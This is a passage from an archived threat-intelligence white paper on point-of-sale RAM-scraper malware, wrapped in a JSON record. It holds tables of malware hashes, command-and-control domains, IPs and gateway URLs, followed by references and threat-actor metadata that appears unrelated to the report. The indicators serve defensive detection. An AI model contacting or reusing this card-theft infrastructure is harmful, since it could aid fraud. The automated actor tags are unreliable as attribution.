ST|\n|026da25835816905926d645607f90195bbf6a398|imagick.biz||\n|b4fcc660a22ec1005712787e2a5f1e691534baa2|222andro.net||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|663dc00b75b62ba32f662d3999a704d9044b368b|backup-service.in.ua/ alfa/gateway.php||\n|663dc00b75b62ba32f662d3999a704d9044b368b|37.0.122.142/alfa/ gateway.php||\n|83a0372438367a6ba3b8e77b312cf386073b3845|houseofcarders.com|TROJ_DEXTR.OP|\n|70e08f55ade152e364ed2523b7c3dacf2d298424|houseofcarders.com|TROJ_DEXTR.UN|\n|e0d3ed6bf2a8576550c7c5bb662be4d8d0cff271|hoqou.su|TROJ_FIDOBOT.SM0|\n|2e3e8a3454262016d1d453c702a0dc8b42e29d5f|84.22.106.94|TROJ_INJECT.AWH|\n|16ce3410a4295132590a0fd81bcf910c731c1b47|mcsup.cc||\n|a157c05b4988e18eb31a5bc087fe3cfd10982eea|h61309.srv5.test-hf.ru||\n|b3f86c635c74c18caecaaf9749344d17cd5a06c8|78.108.93.135||\n|e8db5ad2b7ffede3e41b9c3adb24f3232d764931|151.248.115.107/ ial9121988921973dsa das8dsa080dsa/ gateway.php|TROJ_PINCAV.SY|\n|8e984227ce0c5ac85852ec18dbc4262d4cd63e16|109.234.159.254||\n|8e984227ce0c5ac85852ec18dbc4262d4cd63e16|mcsup.cc||\n|d082f85f265b5fffc39ab1120cd431b9c36a43cf|62.76.44.111/fk/ gateway.php|TROJ_POXTERS.AD|\n|3c93109b22c64acdfc3feba386aa19802481ccb5||TROJ_POXTERS.NIM|\n|9740ee1ff36b00a0e5c4c34ddbdd6fc2e425c25b|||\n|0e7ee5116fbca7653d87fe19171612a6a0278be4|rolex216.8s.nl/go/ go.php|TROJ_SPNR.07FR13|\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|someligeoas.com 582b53580277eb8fc60c84972345bfec7b6eff0c uipoqworkas.com TROJ_SPNR.10B713 208.98.63.228|someligeoas.com||\n||uipoqworkas.com||\n||208.98.63.228||\n|b9b6aea307491ca07deaded821838b86f2961f77|208.98.63.226/goose/ push.php|TROJ_SPNR.11CA13|\n|a80e68e809057f8b060861958eb24feee000732b|hoqou.su|TROJ_SPNR.14H613|\n|5160c089b463ea8c661e5667512edad8d4a331a7|redirection67.net78. net/hm/gateway.php|TROJ_SPNR.15AF14|\n|805dc00b0687646b98971a0220e088658ae8deae|208.98.63.226/goose/ push.php|TROJ_SPNR.15FE13|\n|dailygiftclub.info 41626f258b898d80ef44fc9041835f438fbf4928 TROJ_SPNR.38B814 dailygiftclub1.info|dailygiftclub.info||\n||dailygiftclub1.info||\n|27fe4680e4cb46b32b6063ccf0e48ecba385fbe1|mcsup.cc|TROJ_SPNR.38JH13|\n|f4cb0c9522b5bd1c2a1d1e68f0958e01826b0c85|serveftp.com/www. paypal.com/|TROJ_SPNR.38L213|\n|5d1fce02ef507a7401e7742471fa460dbc0bf415|999andro.net|TSPY_ALINAOS.CC|\n|d875ff7c1834bd28a40ae49e266df4aed29695c3|www . inf0nix . com / notify . php|TSPY_BANKER.CC|\n|genporno.info eb447af477eb480518283a30330ec39c8d5bd7bb TSPY_FAREIT.OP 67.215.65.132|genporno.info||\n||67.215.65.132||\n|2301208c5b75c036b0dcc7aad0fd95f6df3dc10d|sopvps.hk||\n|59821dd4233c2901a7e60e72d417f9dce7357ee2|cl3an45u.biz||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|ccfc0fa22d1e3feeeabc5ca090b76f58f67edada|sopvps.hk||\n|91f1b7b6c7cf89786c770fe9fdc861c4e01d5d5b|sopvps.hk:80/post/ echo||\n||dailygiftclub1.info||\n||dailygiftclub.info||\n|4a248539308bc04ac8d574e34bb984f47814b3a8|www . q1w2e3r4 . pro / bot . php|TSPY_POCARDL.AI|\n|02dc617cfb5ee4449ba10a7ee9a86b3e2e8dff36|tabz.org/Panel/post. php||\n|31dad731919e20c0cb3ce98efc01daea4ac34f21|109.75.176.63||\n|5c6235b78850b7e4c80606227af9c1f2a7c75f66|www . krakau - traktoren . com / panel / post . php||\n|bdd11b46cffad0933e3a62b827e343a8612f630e|mcsup.cc|TSPY_POCARDL.B|\n|266b481113db8a57ef63f7fca7ef0682e5c94f00|109.75.176.63||\n|61627fde1b62ced55715e59bdbbbc13a24c11908|accsforall.net||\n|c8078e219e82b41f0f841efd3e20462a795c6f5c|109.75.176.63||\n|f5f087901529464c0014da1d22e6e1e3cf39d270|autos-mark.comlu.com||\n|262e603e8a388743eac0ca241bc60703a8c465b8|www . q1w2e3r4 . pro / bot . php|TSPY_POCARDL.H|\n|052b95a51a6cdbead362894cc41ce630714e3ae0|ftp.sobachka.comze. com||\n|37c55eba1d13d73392a86e03b1e24def2d2d08ae|ftp.onelove.16mb.com||\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|91a8791a0ec422fa951a84971e71a5a61b66cad0|ftp.onelove.16mb.com||\n|448d43cb663505fe39cf348d84de7fd8763d2d58|ftp.c4a.16mb.com||\n|997e01901442de14aad9e999c02d6ab2a4cdeeb1|ftp.sobachka.comze. com||\n|9b757df9a97f1b65be065da7d64948737925ec8b|||\n|b20d49115653946ae689d0d572fdfc483ea04cc5|||\n|b253ddc656c0d99c2b34c9979251a912ade4dd92|ftp.sobachka.comze. com||\n|fa696af7acbbdca78003eccb798f7afc3fa4c535|184.22.104.41||\n||www . pidginshop . ws / reports /||\n||184.22.104.41||\n||184.22.104.41||\n||ree4.7ci.ru||\n|19a7bcd9381075ed062fb2bb87ae64600afd0b7c|www . inf0nix . com||\n|d72a0b8e7117f0c5e2ef0901bc58274ea41c9d3a|inf0nix.com||\n|7789b069f6eea55e305c4844ac442f6c0d0aa280|193.107.17.126||\n|3634d3fdb93e6ae92ca47188efb320cf636763b8|193.107.17.126||\n|3634d3fdb93e6ae92ca47188efb320cf636763b8|BKDR_DEXTR.A 193.107.17.126 BKDR_DEXTR.B|BKDR_DEXTR.A|\n|||BKDR_DEXTR.B|\n\n\n-----\n\n|PoS RAM Scraper C&C Data|Col2|Col3|\n|---|---|---|\n|SHA-1|C&C Server Address|Trend Micro Detection Name|\n|mirandfg.info 9eb10078dff148ae6d95d3c00f98a1316bca1676 TSPY_ZBOT.SM15 1fresd.info|mirandfg.info||\n||1fresd.info||\n\n\n-----\n\n## REFERENCES\n\n1. Brian Krebs. (October 10, 2013). Krebs on\n\n_Security. “Nordstrom Finds Cash Register_\nSkimmers.” Last accessed August 22,\n2014, http://krebsonsecurity.com/2013/10/\nnordstrom-finds-cash-register-skimmers/.\n\n2. Visa Inc. (2008). “Visa Data Security Alert:\n\nDebugging Software—Memory Parsing\nVulnerability.” Last accessed August 18, 2014,\nhttp://usa.visa.com/download/merchants/\ndebugging_software_memory.pdf.\n\n3. Wade H. Baker, C. David Hylender, and\n\nJ. Andrew Valentine. (2009). “2009 Data\nBreach Investigations Supplemental Report.”\nLast accessed August 18, 2014, http://www.\nverizonenterprise.com/resources/security/\nreports/rp_2009-data-breach-investigationssupplemental-report_en_xg.pdf.\n\n4. Verizon. (2014). “2014 Data Breach\n\nInvestigations Report.” Last accessed August\n18, 2014, http://www.verizonenterprise.com/\nDBIR/2014/reports/rp_Verizon-DBIR-2014_\nen_xg.pdf.\n\n5. Gregory Wallace. (January 13, 2014). CNN\n\n_Money. “Target and Neiman Marcus Hacks:_\nThe Latest.” Last accessed August 18, 2014,\nhttp://money.cnn.com/2014/01/13/news/\ntarget-neiman-marcus-hack/.\n\n6. US-CERT. (January 2, 2014). US-CERT.\n\n“Alert (TA14-002A): Malware Targeting Point\nof Sale Systems.” Last accessed August 18,\n2014, https://www.us-cert.gov/ncas/alerts/\nTA14-002A.\n\n7. Visa Inc. (2014). “Card Acceptance\n\nGuidelines for Visa Merchants.” Last\naccessed August 18, 2014, http://usa.visa.\ncom/download/merchants/card-acceptanceguidelines-for-visa-merchants.pdf.\n\n8. Slava Gomzin. (February 2014). Hacking\n\n_Point of Sale: Payment Application Secrets,_\n_Threats, and Solutions._\n\n\n_9. CreditCards.com. (2013). “How a Credit Card_\n\nIs Processed.” Last accessed August 18,\n2014, http://www.creditcards.com/credit-cardnews/assets/HowACreditCardIsProcessed.\npdf.\n\n10. Pravin Vazirani. (2014). Chetu. “Choosing\n\nBetween Payment Gateway & Payment\nProcessor.” Last accessed August 18, 2014,\nhttp://www.chetu.com/blogs/finance-2/\nchoosing-between-payment-gateway-andpayment-processor-2/#sthash.zlwoHPVZ.\ndpbs.\n\n11. ISO. (2014). “ISO/IEC 7813:2006: Information\n\nTechnology—Identification Cards—Financial\nTransaction Cards.” Last accessed August\n19, 2014, http://www.iso.org/iso/home/\nstore/catalogue_tc/catalogue_detail.\nhtm?csnumber=43317.\n\n12. Wikimedia Foundation, Inc. (August 14,\n\n2014). Wikipedia. “Magnetic Stripe Card.”\nLast accessed August 19, 2014, http://\nen.wikipedia.org/wiki/Magnetic_stripe_card.\n\n13. Numaan Huq. (May 28, 2014). TrendLabs\n\n_Security Intelligence Blog. “Scrape FAST,_\nFind ’em Cards Easy!” Last accessed\nAugust 19, 2014, http://blog.trendmicro.com/\ntrendlabs-security-intelligence/scrape-fastfindem-cards-easy/.\n\n14. Wikimedia Foundation, Inc. (August 19,\n\n2014). Wikipedia. “Bank Card Number.”\nLast accessed August 19, 2014, http://\nen.wikipedia.org/wiki/Bank_card_number.\n\n_15. PCI ComplianceGuide.org. (2014). “PCI_\n\nFAQs.” Last accessed August 19, 2014,\nhttps://www.pcicomplianceguide.org/pcifaqs-2/.\n\n_16. IBM Knowledge Center. “Requirement 1:_\n\nInstall and Maintain a Firewall Configuration\nto Protect Cardholder Data.” Last accessed\nAugust 19, 2014, http://www-01.ibm.com/\n\n\n_Threats, and Solutions._ August 19, 2014, http://www-01.ibm.com/\n\n\n-----\n\nsupport/knowledgecenter/SSZLC2_7.0.0/\ncom.ibm.commerce.pci.doc/concepts/\ncsepcireq1.htm.\n\n17. Chester Wisniewski. (November 30, 2011).\n\n_Naked Security. “Targeted Attacks Steal_\nCredit Cards from Hospitality and Educational\nInstitutions.” Last accessed August 19, 2014,\nhttp://nakedsecurity.sophos.com/2011/11/30/\ntargeted-attacks-steal-credit-cards-fromhospitality-and-educational-institutions/.\n\n18. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “TROJ_BANKER.QPA.” Last_\naccessed August 19, 2014, http://aboutthreats.trendmicro.com/us/malware/troj_\nbanker.qpa.\n\n19. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “ALINA.” Last accessed August_\n19, 2014, http://about-threats.trendmicro.com/\nus/malware/alina.\n\n20. Josh Grunzweig. (May 17, 2013). Trustwave\n\n_SpiderLabs: Anterior. “Alina: Following the_\nShadow Part 1.” Last accessed August 19,\n2014, http://blog.spiderlabs.com/2013/05/\nalina-following-the-shadow-part-1.html.\n\n21. Numaan Huq. (February 16, 2013). Naked\n\n_Security. “Point-of-Sale Malware Attacks—_\nCrooks Expand Their Reach, No Business\nToo Small.” Last accessed August 19, 2014,\nhttp://nakedsecurity.sophos.com/2013/02/16/\npoint-of-sale-malware-attacks-no-businesstoo-small/.\n\n22. Chintan Shah. (March 21, 2013). McAfee\n\n_Blog Central. “VSkimmer Botnet Targets_\nCredit Card Payment Terminals.” Last\naccessed August 19, 2014, http://blogs.\nmcafee.com/mcafee-labs/vskimmer-botnettargets-credit-card-payment-terminals.\n\n23. Aviv Raff. (December 11, 2012). Seculert.\n\n“Dexter—Draining Blood Out of Point of\nSales.” Last accessed August 19, 2014,\nhttp://www.seculert.com/blog/2012/12/dexterdraining-blood-out-of-point-of-sales.html.\n\n24. Marcos Agüero. (February 26, 2014).\n\n_S21sec. “The Dexter Trojan.” Last accessed_\nAugust 19, 2014, http://securityblog.s21sec.\ncom/2014/02/the-dexter-trojan.html.\n\n\n25. Josh Grunzweig. (December 31, 2012).\n\n_Trustwave SpiderLabs: Anterior. “The Dexter_\nMalware: Getting Your Hands Dirty.” Last\naccessed August 19, 2014, http://blog.\nspiderlabs.com/2012/12/the-dexter-malwaregetting-your-hands-dirty.html.\n\n26. Trend Micro Incorporated. (2014). Security\n\n_Intelligence. “Point-of-Sale System Breaches:_\nThreats to the Retail and Hospitality\nIndustries.” Last accessed August 19, 2014,\nhttp://www.trendmicro.com/cloud-content/us/\npdfs/security-intelligence/white-papers/wppos-system-breaches.pdf.\n\n27. Brian Krebs. (January 15, 2014). Krebs on\n\n_Security. “A First Look at the Target Intrusion,_\nMalware.” Last accessed August 20, 2014,\nhttp://krebsonsecurity.com/2014/01/a-firstlook-at-the-target-intrusion-malware/.\n\n28. Identity Theft Resource Center. (March\n\n24, 2014). “Identity Theft Resource\nCenter: 2013 Breach List.” Last\naccessed August 20, 2014, http://www.\nidtheftcenter.org/images/breach/2013/\nUpdatedITRCBreachReport2013.pdf.\n\n29. Brian Krebs. (May 6, 2014). Krebs on\n\n_Security. “The Target Breach, by the_\nNumbers.” Last accessed August 20, 2014,\nhttp://krebsonsecurity.com/2014/05/the-targetbreach-by-the-numbers/.\n\n30. Keith Jarvis and Jason Milletary. (January\n\n24, 2014). “Inside a Targeted Point-of-Sale\nData Breach.” Last accessed August 20,\n2014, http://krebsonsecurity.com/wp-content/\nuploads/2014/01/Inside-a-Targeted-Point-ofSale-Data-Breach.pdf.\n\n31. Matt_Oh. (January 31, 2014). HP. “An\n\nEvolution of BlackPOS Malware.” Last\naccessed August 21, 2014, http://h30499.\nwww3.hp.com/t5/HP-Security-Research-Blog/\nAn-evolution-of-BlackPOS-malware/bap/6359149#.U_WP2PmSySp.\n\n32. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “TSPY_DECBAL.A.” Last_\naccessed August 20, 2014, http://aboutthreats.trendmicro.com/us/malware/TSPY_\nDECBAL.A.\n\n\ncom/2014/02/the-dexter-trojan.html.\n\n\n-----\n\n33. Oracle. (2014). Oracle Java Documentation.\n\n“The While and Do-While Statements.” Last\naccessed August 20, 2014, http://docs.oracle.\ncom/javase/tutorial/java/nutsandbolts/while.\nhtml.\n\n34. Josh Grunzweig. (February 11, 2014).\n\n_Trustwave SpiderLabs: Anterior. “JackPOS—_\nThe House Always Wins.” Last accessed\nAugust 20, 2014, http://blog.spiderlabs.\ncom/2014/02/jackpos-the-house-always-wins.\nhtml.\n\n35. phpBB Group. KernelMode.info. “Point\nof-Sale Malwares/RAM Scrapers.”\nLast accessed August 20, 2014, http://\nwww.kernelmode.info/forum/viewtopic.\nphp?f=16&t=1756&start=160%20#p22150.\n\n36. Matthew Bing. (June 2, 2014). Arbor\n\n_Networks DDoS & Security Reports. “The_\nBest of Both Worlds—Soraya.” Last accessed\nAugust 20, 2014, http://www.arbornetworks.\ncom/asert/2014/06/the-best-of-both-worldssoraya/.\n\n37. Marco Preuss. (December 13, 2013).\n\n_SecureList. “ChewBacca—A New Episode_\nof Tor-Based Malware.” Last accessed\nAugust 20, 2014, http://securelist.com/blog/\nincidents/58192/chewbacca-a-new-episodeof-tor-based-malware/.\n\n38. Yotam Gottesman. (Jnauary 30, 2014). RSA:\n\n_Speaking of Security. “RSA Uncovers New_\nPOS Malware Operation Stealing Payment\nCard & Personal Information.” Last accessed\nAugust 20, 2014, https://blogs.rsa.com/\nrsa-uncovers-new-pos-malware-operationstealing-payment-card-personal-information/.\n\n39. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “TSPY_FYSNA.A.” Last_\naccessed August 20, 2014, http://aboutthreats.trendmicro.com/us/malware/TSPY_\nFYSNA.A.\n\n40. Pierluigi Paganini. (January 20, 2014).\n\n_Security Affairs. “IntelCrawler Update—_\nBlackPOS Author Forgot Delete Social\nNetwork Page.” Last accessed August\n20, 2014, http://securityaffairs.co/\nwordpress/21441/cyber-crime/intelcrawlerblackpos-author-forgot-delete-social-network\n\npage.html.\n\n41. Nart Villeneuve, Joshua Homan, and Kyle\n\nWilhoit. (July 9, 2014). FireEye. “BrutPOS:\nRDP Bruteforcing Botnet Targeting POS\nSystems.” Last accessed August 21, 2014,\nhttp://www.fireeye.com/blog/technical/botnetactivities-research/2014/07/brutpos-rdpbruteforcing-botnet-targeting-pos-systems.\nhtml.\n\n42. Homeland Security. (July 31, 2014).\n\n“Backoff: New Point of Sale Malware.” Last\naccessed August 20, 2014, https://www.\nus-cert.gov/sites/default/files/publications/\nBackoffPointOfSaleMalware.pdf.\n\n43. Josh Grunzweig. (July 31, 2014). Trustwave\n\n_SpiderLabs: Anterior. “Backoff—Technical_\nAnalysis.” Last accessed August 20, 2014,\nhttp://blog.spiderlabs.com/2014/07/backofftechnical-analysis.html.\n\n44. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “TSPY_POSLOGR.A.” Last_\naccessed August 20, 2014, http://aboutthreats.trendmicro.com/us/malware/TSPY_\nPOSLOGR.A.\n\n45. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “TSPY_POSLOGR.B.” Last_\naccessed August 20, 2014, http://aboutthreats.trendmicro.com/us/malware/TSPY_\nPOSLOGR.B.\n\n46. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “TSPY_POSLOGR.C.” Last_\naccessed August 20, 2014, http://aboutthreats.trendmicro.com/us/malware/TSPY_\nPOSLOGR.C.\n\n47. Privacy Rights Clearinghouse. (2014). Last\n\naccessed August 20, 2014, https://www.\nprivacyrights.org/.\n\n48. Wikimedia Foundation, Inc. (August 9,\n\n2014). Wikipedia. “Air Gap (Networking).”\nLast accessed August 20, 2014, http://\nen.wikipedia.org/wiki/Air_gap_(networking).\n\n49. NIST. (2014). National Vulnerability\n\n_Database. “Vulnerability Summary for CVE-_\n2010-1033.” Last accessed August 21,\n2014, http://web.nvd.nist.gov/view/vuln/\n\n\nblackpos-author-forgot-delete-social-network- 2014, http://web.nvd.nist.gov/view/vuln/\n\n\n-----\n\ndetail?vulnId=CVE-2010-1033.\n\n50. Bernadette Irinco. (May 19, 2014). TrendLabs\n\n_Security Intelligence Blog. “Targeted Attack_\nTrends: A Look at 2H 2013.” Last accessed\nAugust 21, 2014, http://blog.trendmicro.\ncom/trendlabs-security-intelligence/targetedattack-trends-a-look-at-2h-2013/.\n\n51. NIST. (2014). National Vulnerability\n\n_Database. “Vulnerability Summary for CVE-_\n2012-1889.” Last accessed August 21,\n2014, http://web.nvd.nist.gov/view/vuln/\ndetail?vulnId=CVE-2012-1889.\n\n52. NIST. (2014). National Vulnerability\n\n_Database. “Vulnerability Summary for CVE-_\n2012-4681.” Last accessed August 21,\n2014, http://web.nvd.nist.gov/view/vuln/\ndetail?vulnId=CVE-2012-4681.\n\n53. NIST. (2014). National Vulnerability\n\n_Database. “Vulnerability Summary for CVE-_\n2008-4841.” Last accessed August 21,\n2014, http://web.nvd.nist.gov/view/vuln/\ndetail?vulnId=CVE-2008-4841.\n\n54. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “Adobe TIFF File Vulnerability.”_\nLast accessed August 21, 2014, http://aboutthreats.trendmicro.com/us/vulnerability/722/\nadobe%20tiff%20file%20vulnerability.\n\n55. NIST. (2014). National Vulnerability\n\n_Database. “Vulnerability Summary for CVE-_\n2010-2883.” Last accessed August 21,\n2014, http://web.nvd.nist.gov/view/vuln/\ndetail?vulnId=CVE-2010-2883.\n\n56. NIST. (2014). National Vulnerability Database.\n\n“Search CVE and CCE Vulnerability\nDatabase.” Last accessed August 21, 2014,\nhttp://web.nvd.nist.gov/view/vuln/search.\n\n57. Trend Micro Incorporated. (2014). Threat\n\n_Encyclopedia. “Lateral Movement: How_\nDo Threat Actors Move Deeper into Your\nNetwork?” Last accessed August 21, 2014,\nhttp://about-threats.trendmicro.com/cloudcontent/us/ent-primers/pdf/tlp_lateral_\nmovement.pdf.\n\n58. Ground Labs. (January 2014). Cardholder\n\n\nof Card Recon in Circulation.” Last accessed\nAugust 21, 2014, http://www.groundlabs.com/\nblog/index.php/2014/06/unauthorised-copiesof-card-recon-in-circulation/.\n\n59. Vincenzo Ciancaglini, Marco Balduzzi, Max\n\nGoncharov, and Robert McArdle. (2013).\n_Security Intelligence. “Deep Web and_\nCybercrime: It’s Not All About Tor.” Last\naccessed August 21, 2014, http://www.\ntrendmicro.ca/cloud-content/us/pdfs/securityintelligence/white-papers/wp-deepweb-andcybercrime.pdf.\n\n60. Max Goncharov. (2014). Security Intelligence.\n\n“Russian Underground Revisited.” Last\naccessed August 21, 2014, http://www.\ntrendmicro.com/cloud-content/us/pdfs/\nsecurity-intelligence/white-papers/wp-russianunderground-revisited.pdf.\n\n61. Jaikumar Vijayan. (March 29, 2007).\n\n_Computerworld. “TJX Data Breach: At 45.6M_\nCard Numbers, It’s the Biggest Ever.” Last\naccessed August 26, 2014, http://www.\ncomputerworld.com/s/article/9014782/TJX_\ndata_breach_At_45.6M_card_numbers_it_s_\nthe_biggest_ever.\n\n62. Brian Krebs. (July 25, 2013). Krebs on\n\n_Security. “Hacker Ring Stole 160 Million_\nCredit Cards.” Last accessed August 26,\n2014, http://krebsonsecurity.com/2013/07/\nhacker-ring-stole-160-million-credit-cards/.\n\n63. Tom Gara. (February 6, 2014). The Wall\n\n_Street Journal. “October 2015: The End of the_\nSwipe-and-Sign Credit Card.” Last accessed\nAugust 21, 2014, http://blogs.wsj.com/\ncorporate-intelligence/2014/02/06/october2015-the-end-of-the-swipe-and-sign-creditcard/.\n\n64. Bob Russo. (March 4, 2014). “Statement\n\nfor the Record: Can Technology\nProtect Americans from International\nCybercriminals?” Last accessed August\n21, 2014, http://science.house.gov/sites/\nrepublicans.science.house.gov/files/\ndocuments/HHRG-113-SY21-WStateBRusso-20140306.pdf.\n\n65. Lysa Myers. (April 3, 2014). WeLiveSecurity.\n\n\n_Data Discovery Blog. “Unauthorised Copies_ “What Is EMV, and Why Is It Such a Hot\n\n\n-----\n\nTopic?” Last accessed August 21, 2014,\nhttp://www.welivesecurity.com/2014/04/03/\nwhat-is-emv-and-why-is-it-such-a-hot-topic/.\n\n66. Steven Murdoch, Saar Drimer, Ross\n\nAnderson, and Mike Bond. (July 25, 2014).\n_Chip and PIN Is Broken._\n\n67. emvx. (January 31, 2011). Emvx Blog.\n\n“Contactless Card Payment Specifications.”\nLast accessed August 21, 2014, http://blog.\nlevel2kernel.com/contactless-card-paymentspecifications/.\n\n68. Trend Micro Incorporated. (2014). Trend\n\n_Micro. “Deep Security.” Last accessed August_\n\n\n21, 2014, http://www.trendmicro.com/us/\nenterprise/cloud-solutions/deep-security/.\n\n69. Trend Micro Incorporated. (2014). Trend\n\n_Micro. “Only a Custom Defense Effectively_\nCombats Advanced Persistent Threats.”\nLast accessed August 21, 2014, http://www.\ntrendmicro.com/us/enterprise/challenges/\nadvance-targeted-attacks/.\n\n70. Trend Micro Incorporated. (2014). Trend\n\n_Micro. “Deep Discovery.” Last accessed_\nAugust 21, 2014, http://www.trendmicro.com/\nus/enterprise/security-risk-management/deepdiscovery/.\n\n\n-----\n\nTrend Micro Incorporated, a global leader in security software, strives to make the\nworld safe for exchanging digital information. Our innovative solutions for consumers,\nbusinesses and governments provide layered content security to protect information\non mobile devices, endpoints, gateways, servers and the cloud. All of our solutions are\npowered by cloud-based global threat intelligence, the Trend Micro™ Smart Protection\nNetwork™, and are supported by over 1,200 threat experts around the globe. For more\n[information, visit www.trendmicro.com.](http://www.trendmicro.com/us/index.html)\n\n©2014 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend\nMicro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated.\nAll other product or company names may be trademarks or registered trademarks of\ntheir owners.\n\n\n225 E. John Carpenter Freeway, Suite 1500\nIrving, Texas 75062 U.S.A.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.wired.com/wp-content/uploads/2014/09/wp-pos-ram-scraper-malware.pdf"
    ],
    "report_names": [
        "wp-pos-ram-scraper-malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "33f527a5-a5da-496a-a48c-7807cc858c3e",
            "created_at": "2022-10-25T15:50:23.803657Z",
            "updated_at": "2025-03-27T02:00:55.550132Z",
            "deleted_at": null,
            "main_name": "PLATINUM",
            "aliases": [
                "PLATINUM"
            ],
            "source_name": "MITRE:PLATINUM",
            "tools": [
                "JPIN",
                "Dipsind",
                "adbupd"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7d8ef10e-1d7b-49a0-ab6e-f1dae465a1a4",
            "created_at": "2023-01-06T13:46:38.595679Z",
            "updated_at": "2025-03-27T02:00:02.869216Z",
            "deleted_at": null,
            "main_name": "PLATINUM",
            "aliases": [
                "TwoForOne",
                "G0068",
                "ATK33"
            ],
            "source_name": "MISPGALAXY:PLATINUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e61c46f7-88a1-421a-9fed-0cfe2eeb820a",
            "created_at": "2022-10-25T16:07:24.061767Z",
            "updated_at": "2025-03-27T02:02:10.094583Z",
            "deleted_at": null,
            "main_name": "Platinum",
            "aliases": [
                "ATK 33",
                "Operation EasternRoppels",
                "TwoForOne"
            ],
            "source_name": "ETDA:Platinum",
            "tools": [
                "AMTsol",
                "Adupib",
                "Adupihan",
                "Dipsind",
                "DvDupdate.dll",
                "JPIN",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "RedPepper",
                "RedSalt",
                "Titanium",
                "adbupd",
                "psinstrc.ps1"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1410187257,
    "ts_modification_date": 1410187680,
    "files": {
        "pdf": "https://archive.orkl.eu/425cc0813bd73bec97ef4b8d80b543bfdc94bac9.pdf",
        "text": "https://archive.orkl.eu/425cc0813bd73bec97ef4b8d80b543bfdc94bac9.txt",
        "img": "https://archive.orkl.eu/425cc0813bd73bec97ef4b8d80b543bfdc94bac9.jpg"
    }
}